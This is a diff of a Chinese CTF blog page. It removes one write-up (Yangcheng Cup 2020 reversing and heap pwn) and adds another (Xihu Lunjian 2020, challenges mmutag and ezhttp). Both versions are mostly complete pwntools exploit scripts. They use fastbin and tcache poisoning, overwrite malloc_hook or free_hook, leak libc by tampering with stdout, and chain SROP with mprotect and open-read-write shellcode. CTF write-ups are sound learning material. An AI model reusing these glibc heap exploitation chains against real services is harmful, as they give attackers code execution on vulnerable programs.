@@ -15,7 +15,7 @@
   <meta name="description" content>
   <meta name="author" content="chumen77">
   <meta name="keywords" content>
-  <title>羊城杯2020部分wp ~ Chumen77&#39;s Blog</title>
+  <title>西湖论剑部分wp ~ Chumen77&#39;s Blog</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
@@ -112,7 +112,7 @@
               
                 <p class="mt-3">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  星期一, 九月 14日 2020, 8:56 晚上
+                  星期五, 十月 9日 2020, 8:23 早上
                 </p>
               
 
@@ -121,7 +121,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    2.3k 字
+                    2.1k 字
                   </span>&nbsp;
                 
 
@@ -129,7 +129,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      12 分钟
+                      10 分钟
                   </span>&nbsp;
                 
 
@@ -162,119 +162,29 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h1 id="羊城杯2020部分wp"><a href="#羊城杯2020部分wp" class="headerlink" title="羊城杯2020部分wp"></a>羊城杯2020部分wp</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>Python exe的逆向。其中在修复pyc时，个人不是很熟悉，记录一下：</p>
-<p> 在脱去以后，会有主程序，跟一个struct的文件。</p>
-<p>要保证主程序与struct的前面的魔法字节是相同一样的。</p>
-<p><img src="http://qiqianyun.chumen77.xyz/uPic/yFiJmM.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r9gtZs.png" srcset="/img/loading.gif" alt><br>重点关注前16个字节，保证相同即可。<br>修复好pyc后，就可以进行反编译。<br>剩下的就是逆算法，需要用到z3。</p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">#!/usr/bin/env python2.7
-from z3 import *
-&#39;&#39;&#39;
-a1 = Int(&#39;a1&#39;)
-a2 = Int(&#39;a2&#39;)
-a3 = Int(&#39;a3&#39;)
-a4 = Int(&#39;a4&#39;)
-a5 = Int(&#39;a5&#39;)
-a6 = Int(&#39;a6&#39;)
-a7 = Int(&#39;a7&#39;)
-a8 = Int(&#39;a8&#39;)
-a9 = Int(&#39;a9&#39;)
-a10 = Int(&#39;a10&#39;)
-a11 = Int(&#39;a11&#39;)
-a12 = Int(&#39;a12&#39;)
-a13 = Int(&#39;a13&#39;)
-a14 = Int(&#39;a14&#39;)
-s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748)
-s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258)
-s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190)
-s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * (2 ** 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136)
-s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915)
-s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298)
-s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875)
-s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784)
-s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710)
-s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376)
-s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065)
-s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687)
-s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250)
-s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)
-
-if s.check() == sat:
-    result = s.model()
-    print result
-&#39;&#39;&#39;
-&#39;&#39;&#39;
-[a2 = 24,
- a13 = 88,
- a6 = 43,
- a9 = 52,
- a14 = 33,
- a5 = 104,
- a12 = 74,
- a7 = 28,
- a1 = 119,
- a10 = 108,
- a11 = 88,
- a8 = 91,
- a4 = 7,
- a3 = 10]
-&#39;&#39;&#39;
-
-key = [10,24,119,7,104,43,28,91,108,52,88,74,88,33]
-flag = &#39; &#39;
-for i in range(13,0,-1):
-    key[i-1] = key[i] ^ key[i - 1]
-    flag += chr(key[i-1])
-
-flag = flag[::-1]
-flag += chr(33)
-print(flag)</code></pre>
-<p>其中在z3中处理逻辑运算时，是很特殊的，这个需要注意，具体可以看z3的官方文档。<br>可以参考：<br><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/" target="_blank" rel="noopener">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p>
-<p>还有遇到逻辑左移右移：</p>
-<pre><code class="python">1. “&gt;&gt;”
-int x = 16; printf(&quot;%d\n&quot;, x &gt;&gt; 1);
-先将x转成二进制 10000, 不读最后一位， 输出 1000， 即为8;
-右移一位相当于数值除以2
-
-2. “&lt;&lt;”
-int x = 16; printf(&quot;%d\n&quot;, x &lt;&lt; 1);
-先将x转成二进制 10000, 往最后再读取一位(0, 或根据是否已经有移位)， 输出 100000， 即为32;
-左移，若移动位数K等于或大于数据长度N,通常只移动K mod N 位数
-左移一位相当于数值乘以2</code></pre>
-<p>在这里是左移7，也就是乘 2 的7次方。</p>
-<h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>3层加密.</p>
-<ul>
-<li>一个base64</li>
-<li>一个以13字节，分割字符，进行移位</li>
-<li>单字节凯撒加密，但是也加入了对数字的处理</li>
+            <h1 id="西湖论剑部分wp"><a href="#西湖论剑部分wp" class="headerlink" title="西湖论剑部分wp"></a>西湖论剑部分wp</h1><h2 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>给了一个栈地址</li>
+<li>没有show函数</li>
+<li>free 函数存在uaf</li>
+<li>add函数只能申请堆号为1-10的堆块，大小仅为0x68</li>
+<li>可以给栈上读一段数据</li>
 </ul>
-<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">import base64
-key = &#39;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&#39;
-key = [ord(c) for c in key]
-buf = [0]*52
-for i in range(len(key)):
-    if key[i] &gt; 64 and key[i] &lt;=90:
-        buf[i] = (key[i] - 65 - 3) % 26 + 65
-        continue
-    if key[i] &gt; 96 and key[i] &lt;=122:
-        buf[i] =  (key[i] - 97 - 3) % 26 + 0x61
-        continue
-    if key[i] &gt; 47 and key[i] &lt;=57:
-        buf[i] = (key[i] - 48 - 3) % 10 + 48
-        continue
-    buf[i] = key[i]
-buf = [chr(c) for c in buf]
-key2 = &#39;&#39;
-for i in buf:
-    key2 += i
-
-key2 = key2[13:26] + key2[39:52] + key2[:13] + key2[26:39]
-flag = base64.b64decode(key2)
-print(flag)
-</code></pre>
-<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="sing-in"><a href="#sing-in" class="headerlink" title="sing in"></a>sing in</h3><p>入门堆题，存在uaf，进行<code>fastbin attcak</code>即可。</p>
-<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *
+<pre><code class="c">char buf; // [rsp+10h] [rbp-20h]</code></pre>
+<pre><code class="c">  if ( v3 != 3 )
+        break;
+      read(0, &amp;buf, 0x20uLL);
+      printf(&quot;Your content: %s\n&quot;, &amp;buf);</code></pre>
+<p>利用这个可以泄漏栈上的数据，也可以在栈上写一定的数据。</p>
+<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>如何泄漏libc地址。</p>
+<p>栈上是有很多数据的，可以用choice 3进行泄漏一定的数据，但是由于<code>\x00</code>的截断，泄漏一个stack地址后，其后有用的libc地址没办法泄漏。</p>
+<p>看下其栈情况：</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/IqyiLw.png" srcset="/img/loading.gif" alt><br>可控区域0x20，如果可以填充其中无用的数据到libc地址，再利用一次 choice 3 即可完成泄漏。</p>
+<p>现在也已经知道了stack的地址。伪造一个0x70的堆，然后fastbin attack即可申请到这栈上的内存。然后填充，获取libc地址。接着攻击malloc hook即可。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
+# encoding: utf-8
+from pwn import *
 import time
-local_file  = &#39;./pwn&#39;
+local_file  = &#39;./mmutag&#39;
 elf = ELF(local_file)
 context.log_level = &#39;debug&#39;
 debug = 0
@@ -282,13 +192,16 @@ if debug:
     io = process(local_file)
     libc = elf.libc
 else:
-    io = remote(&#39;183.129.189.60&#39;,10029)
+    io = remote(&#39;183.129.189.61&#39;,55704)
     libc = elf.libc
     #libc = ELF(&#39;.&#39;)
 context.arch = elf.arch
 context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
 #,&#39;&#39;splitw&#39;,&#39;-h&#39;
 rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+rce18 = [0x4f2c5,0x4f322,0x10a38c]
+realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
+arae18 = 0x3ebca0
 s      = lambda data               :io.send(data) 
 sa      = lambda delim,data         :io.sendafter(delim, data)
 sl      = lambda data               :io.sendline(data)
@@ -303,67 +216,125 @@ def debug():
     # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
     gdb.attach(io)
     pause()
-def add(size,name,mes):
-    sla(&#39;Your choice :&#39;,&#39;1&#39;)
-    sla(&#39;size&#39;,str(size))
-    sa(&#39;name&#39;,str(name))
-    sla(&#39;mes&#39;,str(mes))
-def show():
-    sla(&#39;Your choice :&#39;,&#39;2&#39;)
-def free(idx):
-    sla(&#39;Your choice :&#39;,&#39;3&#39;)
-    sla(&#39;index:&#39;,str(idx))
-payload = &#39;a&#39; * 0x60
-mes = &#39;b&#39; * 23
-add(0x100,payload,mes)
-add(0x60,payload,mes)
-free(0)
-add(0x60,&#39; &#39;,mes)
-show()
-ru(&quot;Game[2]&#39;s name :&quot;)
-libc_base = uu64(r(6)) - 0x3c4b20
-info_addr(&#39;libc_base&#39;,libc_base)
 
-free(2)
+def input_introduce(data):
+    sla(&#39;your introduce&#39;,str(data))
+def add(idx,data):
+    sla(&#39;ise&#39;,&#39;1&#39;)
+    sla(&#39;id&#39;,str(idx))
+    sa(&#39;tent&#39;,str(data))
+
+def free(idx):
+    sla(&#39;ise&#39;,&#39;2&#39;)
+    sla(&#39;id&#39;,str(idx))
+
+data = &#39;1&#39; * 0x60
+sa(&#39;name&#39;,data)
+ru(&#39;0x&#39;)
+leak_libc = int(r(12),16)
+sla(&#39;ice&#39;,&#39;2&#39;)
+add(1,&#39;chumen77&#39;)
+add(2,&#39;chumen77&#39;)
 free(1)
 free(2)
-
-malloc_hook = libc_base + 0x3c4aed
-add(0x60,p64(malloc_hook),p64(malloc_hook))
-add(0x60,p64(malloc_hook),p64(malloc_hook))
-add(0x60,p64(malloc_hook),p64(malloc_hook))
-one = 0x4527a + libc_base
-payload = &#39;1&#39; * 11 + p64(0) + p64(one)
-add(0x60,payload,payload)
+free(1)
+sla(&#39;ise&#39;,&#39;3&#39;)
+payload = p64(0) + p64(0x70) + p64(0)
+s(payload)
+add(4,p64(leak_stack - 0x40))
+add(5,&#39;1&#39;)
+add(6,&#39;1&#39;)
+add(7,&#39;1&#39; * 0x47 + &#39;2&#39;)
+sla(&#39;ise&#39;,&#39;3&#39;)
+s(&#39;1&#39; * 0x20)
+info_addr(&#39;leak-stack&#39;,leak_stack)
+ru(&#39;2&#39;)
+libc_base = uu64(r(6)) - 0x20840
+info_addr(&#39;libc_base&#39;,libc_base)
+free(1)
+free(2)
+free(1)
+malloc_hook  = 0x3c4aed + libc_base
+add(3,p64(malloc_hook))
+add(8,&#39;1&#39;)
+add(9,&#39;1&#39;)
+one = 0xf0364 + libc_base
+payload = (3 + 0x10) * &#39;\x00&#39; + p64(one)
+add(10,payload)
+free(3)
+free(3)
+# debug()
 itr()</code></pre>
-<p>其中可以申请一个堆，进行getshell，也可以同时2次free同一个chunk，触发报错函数，而调用报错函数的时候又会用到<code>malloc_hook</code>，从而getshell。</p>
-<h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><ul>
-<li>只有add和del功能</li>
-<li>存在uaf</li>
-<li>只能申请&lt;0x70的堆块</li>
+<p>最后因为没有堆可以申请，可以故意触发报错，其会调用到malloc来储存部分数据，此时也就可以get shell。</p>
+<h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>看起来较为复杂，因为实现了一个对Http packet的交互，让我这种不是很熟悉http packet，coding能力差的人，逆向起来有点吃力。</p>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h4><ul>
+<li>简易的Http packet结构</li>
+<li><code>setcontext</code> 函数的exploit</li>
+<li>各种不熟悉的字符串处理函数<code>sscanf strchr strtok</code> </li>
 </ul>
-<h4 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h4><p>需要利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列。</p>
-<p>参考链接：</p>
-<p><a href="https://www.anquanke.com/post/id/176139" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176139</a></p>
-<p><a href="https://blog.csdn.net/plus_re/article/details/79265805" target="_blank" rel="noopener">https://blog.csdn.net/plus_re/article/details/79265805</a></p>
-<p><code>malloc_consolidate</code>具体步骤如下：</p>
-<ol>
-<li>判断fastbin是否初始化，如果未初始化，则进行初始化然后退出。</li>
-<li>按照fastbin由小到大的顺序（0x20 ,0x30 ,0x40这个顺序）合并chunk，每种相同大小的fastbin中chunk的处理顺序是从fastbin-&gt;fd开始取，下一个处理的是p-&gt;fd，依次类推。</li>
-<li>首先尝试合并<code>pre_chunk</code>。</li>
-<li>然后尝试合并<code>next_chunk</code>：如果<code>next_chunk</code>是<code>top_chunk</code>，则直接合并到<code>top_chunk</code>，然后进行第六步；如果<code>next_chunk</code>不是<code>top_chunk</code>，尝试合并。</li>
-<li>将处理完的chunk插入到unsorted bin头部。</li>
-<li>获取下一个空闲的fastbin，回到第二步，直到清空所有fastbin中的chunk，然后退出。</li>
-</ol>
-<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul>
-<li>利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列，在堆上留下libc的相关地址</li>
-<li>利用fastbin attack ，打<code>__IO_2_1_stdout</code>，泄漏libc</li>
-<li>利用fastbin attack ，打<code>malloc_hook</code></li>
+<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><ul>
+<li>开头初始化，开启了沙箱，只能orw来获取flag</li>
+<li>add函数，以输入的字符数量来给你分配堆，所以<code>\x00</code>用不了了，最大0x100，且给了heap的地址</li>
+<li>del 函数，存在uaf</li>
+<li>无show函数</li>
+<li>edit函数，可以输入<code>\x00</code>的字符，无vul</li>
 </ul>
-<p>难点在申请堆块的数量,题目限制了19个，是刚刚够用。</p>
-<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
+<li>free 0x100的chunk 8次，使其进入unsortbin，留着攻击stdout</li>
+<li>tcache attack 攻击到<code>_IO_2_1_stdout_</code> ，使其泄漏libc地址</li>
+<li>tcache attack 攻击free hook，写上setcontext + 53 ，准备srop进行攻击</li>
+<li>srop读入mprotect的rop chain，开启heap段的执行权限</li>
+<li>edit 一个heap的内存为 orw flag</li>
+<li>触发free hook，orw get flag</li>
+</ul>
+<h3 id="细节集合"><a href="#细节集合" class="headerlink" title="细节集合"></a>细节集合</h3><h4 id="对于stdout的攻击"><a href="#对于stdout的攻击" class="headerlink" title="对于stdout的攻击"></a>对于stdout的攻击</h4><p>其中，在利用libc残留伪造stdout地址作为fd的时候，只要改3字节，其肯定是申请的0x20的堆，但是上stdout结构体时需要0x21字节的写入。<br>tcache分配中，并不验证堆的大小，只要fd指好就OK了，所以申请个至少可以写入0x21字节的堆即可。但是由于程序分配chunk的策略，申请时肯定要写数据，写什么不会crush。个人做的时候,乱填充数据，crush了很多次，头都炸了。可以看一下<code>_IO_2_1_stdout_</code>结构体：</p>
+<pre><code>pwndbg&gt; ptype stdout
+type = struct _IO_FILE {
+    int _flags;
+    char *_IO_read_ptr;
+    char *_IO_read_end;
+    char *_IO_read_base;
+    char *_IO_write_base;  
+    char *_IO_write_ptr;   
+    char *_IO_write_end;
+    char *_IO_buf_base;
+    char *_IO_buf_end;
+    char *_IO_save_base;
+    char *_IO_backup_base;
+    char *_IO_save_end;
+    struct _IO_marker *_markers;
+    struct _IO_FILE *_chain;
+    int _fileno;
+    int _flags2;
+    __off_t _old_offset;
+    unsigned short _cur_column;
+    signed char _vtable_offset;
+    char _shortbuf[1];
+    _IO_lock_t *_lock;
+    __off64_t _offset;
+    struct _IO_codecvt *_codecvt;
+    struct _IO_wide_data *_wide_data;
+    struct _IO_FILE *_freeres_list;
+    void *_freeres_buf;
+    size_t __pad5;
+    int _mode;
+    char _unused2[20];
+} *</code></pre><p>在学习io file相关知识时，可以了解到对于获取和输出信息，很重要的就是开头<code>_flags</code> ，其决定了此时io的状况。</p>
+<p>其中注意到<code>_flags</code> 大小是int型，所以在libc地址其读取和验证将要做什么时，是以int的宽度来获取的。所以设置对低位8字节即可。比如<code>0xfffffffffbad3c80</code> <code>0x12345678fbad3c80</code> ,剩下的就好说了，全弄成<code>a</code>的垃圾字符堆。</p>
+<p>然后再次edit，这个<code>_IO_2_1_stdout_</code>即可泄漏出libc地址。</p>
+<h4 id="改free-hook写setcontext时的细节"><a href="#改free-hook写setcontext时的细节" class="headerlink" title="改free hook写setcontext时的细节"></a>改free hook写setcontext时的细节</h4><p>其中需要注意一下libc版本，在最低的libc 2.27版本中，其经常是以<code>0xXXXXXXX00a0</code>这样的存在。直接改写时，<code>/x00</code>被截断，写不上free hook。然后想着用edit 进行修改。但是会发现，此时坏的free hook情况下，用edit直接crush。</p>
+<p>考虑升级一下libc版本号对应对赛题服务器的libc版本，但是libc2.27最近更新了，直接<code>apt upgrade libc6</code> 就会升级到libc 2.27:1.3最新版本，其增加了对double free的检测，就直接做不了了。</p>
+<p>apt 指定版本的升级：</p>
+<pre><code>apt-cache madison libc6                  
+apt-get install libc6=2.27-3ubuntu1.2 
+
+apt-cache madison libc6-dbg
+apt-get install libc6-dbg=2.27-3ubuntu1.2</code></pre><p>这样就升级好了，并且解决了个人写setcontext的问题，因为其地址没有再有``x00```。</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
+# encoding: utf-8
+from pwn import *
 import time
-local_file  = &#39;./pwn&#39;
+local_file  = &#39;./ezhttp&#39;
 elf = ELF(local_file)
 context.log_level = &#39;debug&#39;
 debug = 1
@@ -371,13 +342,13 @@ if debug:
     io = process(local_file)
     libc = elf.libc
 else:
-    io = remote(&#39;node3.buuoj.cn&#39;,27411)
+    io = remote(&#39;172.17.0.2&#39;,23946)
     libc = elf.libc
     #libc = ELF(&#39;.&#39;)
 context.arch = elf.arch
 context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
 #,&#39;&#39;splitw&#39;,&#39;-h&#39;
-rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+arae18 = 0x3ebca0
 s      = lambda data               :io.send(data) 
 sa      = lambda delim,data         :io.sendafter(delim, data)
 sl      = lambda data               :io.sendline(data)
@@ -392,92 +363,112 @@ def debug():
     # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
     gdb.attach(io)
     pause()
+# debug()
+def add(data):
+    content = &#39;POST\n&#39;
+    content += &#39;/create \nCookie: user=admin token: \r\n\r\n&#39;
+    content += &#39;content=&#39;+str(data)
+    ru(&#39;Send Http packet to me:&#39;)
+    s(str(content))
+    sleep(0.05)
 
-def add(size,name,mes):
-    sla(&#39;Your choice :&#39;,&#39;1&#39;)
-    sla(&#39;size&#39;,str(size))
-    sa(&quot;game&#39;s name:&quot;,str(name))
-    sla(&#39;mes&#39;,str(mes))
-
-
-def free(idx):
-    sla(&#39;Your choice :&#39;,&#39;2&#39;)
-    sla(&#39;index:&#39;,str(idx))
+def free(index):
+    content = &#39;POST\n&#39;
+    content += &#39;/del \nCookie: user=admin token: \r\n\r\n&#39;
+    content += &#39;index=&#39;+str(index)
+    ru(&#39;Send Http packet to me:&#39;)
+    s(str(content))
+def edit(idx,data):
+    content = &#39;POST\n&#39;
+    content += &#39;/edit \nCookie: user=admin token: \r\n\r\n&#39;
+    content += &#39;index=&#39;+ str(idx) + &#39;&amp;content=&#39;+str(data)+ &#39;\n&#39;
+    s(str(content))
+    sleep(0.05)
 
 def leak_addr():
-    payload = &#39;a&#39; * 0x28
-    mes = &#39;2&#39; * 23
-    add(0x28,payload,mes) #0
-    add(0x28,payload,mes) #1
-    add(0x28,payload,mes) #2
+    payload = &#39;1&#39; *0x100
+    add(payload) 
+    ru(&#39;0x&#39;)
+    heap_base = int(r(12),16) - 0x10
+    info_addr(&#39;heap_base&#39;,heap_base)
+    add(payload) 
+    add(&#39;1&#39;*0x8) 
+    add(&#39;1&#39;*0xf8)
+    for i in range(7):
+        free(0)
     free(0)
-    free(1)
-    free(2)
-    add(0x68,payload,mes) #3
-    add(0x68,payload,mes) #4
-    add(0x68,payload,mes) #5
-    add(0x68,payload,mes) #6
-    free(3)
-    free(4)
-    free(5)
+    add(&#39;\x60\xa7&#39;) 
+    add(&#39;1&#39;*0x18) 
+    add(&#39;1&#39;*0x20) 
+    free(6)
+    free(6)
+    add(&#39;1&#39;*0x20) 
+    payload = p64(heap_base + 0x10)
+    edit(7,payload)
+    add(&#39;1&#39;*0x20) 
     # debug()
-    sla(&#39;Your choice :&#39;,&#39;2&#39;)
-    sl(&#39;1&#39;*0x500)
-    free(0)
-    free(1)
-    free(2)
-    add(0x68,p16(0xb5dd),&#39;1&#39;) #7
-    add(0x68,p16(0xb5dd),&#39;1&#39;) #8
-    free(6)
-    free(7)
-    free(6)
-    add(0x68,p8(0x90),&#39;1&#39;) #9
-    add(0x68,&#39;1&#39;,&#39;1&#39;) #10
-    add(0x68,&#39;1&#39;,&#39;1&#39;) #11
-    add(0x68,&#39;1&#39;,&#39;1&#39;) #12
-    payload = &#39;b&#39; * 0x33 + p64(0xfbad3c80) + p64(0) * 3 + p8(0)
-    sla(&#39;Your choice :&#39;,&#39;1&#39;)
-    sla(&#39;size&#39;,&#39;104&#39;) #13
-    sa(&#39;name&#39;,payload)
-
+    add(&#39;1&#39;*0x20) 
+    sleep(0.1)
+    payload = p64(0x12345678fbad3c80) + &#39;\x01&#39; *0x20
+    add(payload) #8
+    payload = p64(0xfbad3c80) + p64(0) * 3 + &#39;\x00&#39;
+    edit(10,payload)
+    add(&#39;1&#39;*0x90)
+    return heap_base
 leak = 0
 while True:
     try:
-        leak_addr()
+        heap_base = leak_addr()
         ss = io.recvuntil(chr(0x7f),timeout = 0.5)
         if len(ss) == 0:
             raise Exception(&#39;&#39;)
-        io.recv(10)
-        leak = uu64(r(6))
-        if leak == 0x7ff81b57b6a3:
+        io.recv(16)
+        leak = u64(io.recv(8))
+        if leak == 0x320a6464412e310a:
             raise Exception(&#39;&#39;)
         break
     except Exception:
         io.close()
-        io = process(&#39;./pwn&#39;)
-        # io = remote(&#39;39.101.184.181&#39;,10000)
+        io = process(&#39;./ezhttp&#39;)
         continue
 
+leak = leak &gt;&gt; 16
 info_addr(&#39;leak&#39;,leak)
-libc_addr = leak - 0x3c56a3
-info_addr(&#39;libc_base&#39;,libc_addr)
-ru(&#39;age&#39;)
-sl(&#39;1&#39;)
-free(10)
-free(11)
-free(10)
+libc_base = leak - 0x3eb780
+info_addr(&#39;libc_base&#39;,libc_base)
+free_hook = 0x3ed8e8 + libc_base
+set_context = libc.sym[&#39;setcontext&#39;] + 53 + libc_base
+info_addr(&#39;heap_base&#39;,heap_base)
+info_addr(&#39;context&#39;,set_context)
+orw = shellcraft.open(&#39;./flag&#39;)
+orw +=shellcraft.read(&#39;rax&#39;,heap_base+0x300,0x30)
+orw +=shellcraft.write(1,heap_base+0x300,0x30)
+edit(11,asm(orw))
+# debug()
+frame = SigreturnFrame()
+frame.rdi = 0
+frame.rsi = free_hook
+frame.rdx = 0x300
+frame.rsp = free_hook
+frame.rip = libc_base + libc.search(asm(&quot;syscall \nret&quot;)).next()
+edit(1,str(frame))
+free(2)
+free(2)
+free(2)
+# debug()
+add(p64(free_hook))
+add(&#39;1&#39;*6)
+info_addr(&#39;context&#39;,set_context)
+add(p64(set_context))
+# debug()
+free(1)
+pop_rdi = 0x000000000002155f+libc_base
+pop_rsi = 0x0000000000023e8a+libc_base
+pop_rdx = libc_base+0x0000000000001b96
+pop_rax = libc_base+0x0000000000043a78
 
-malloc_hook = 0x3c4aed + libc_addr
-add(0x68,p64(malloc_hook),&#39;1&#39;)
-add(0x68,&#39;1&#39;,&#39;1&#39;)
-add(0x68,&#39;1&#39;,&#39;1&#39;)
-one_rec = 0xf0364 + libc_addr
-payload = &#39;1&#39; * (0x13-8) + p64(0)+ p64(one_rec)
-add(0x68,payload,&#39;1&#39;)
-free(6)
-free(6)
-
-
+payload = flat([pop_rdi,heap_base-0x250,pop_rsi,0x1000,pop_rdx,7,libc_base+libc.sym[&#39;mprotect&#39;],heap_base+0x80])
+s(payload)
 itr()</code></pre>
 
             <hr>
@@ -489,8 +480,6 @@ itr()</code></pre>
             
               <span>
                 <i class="iconfont icon-tag"></i>
-                
-                  <a class="hover-with-bg" href="/tags/re">re</a>
                 
                   <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                 
@@ -648,7 +637,7 @@ itr()</code></pre>
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "羊城杯2020部分wp&nbsp;",
+        "西湖论剑部分wp&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
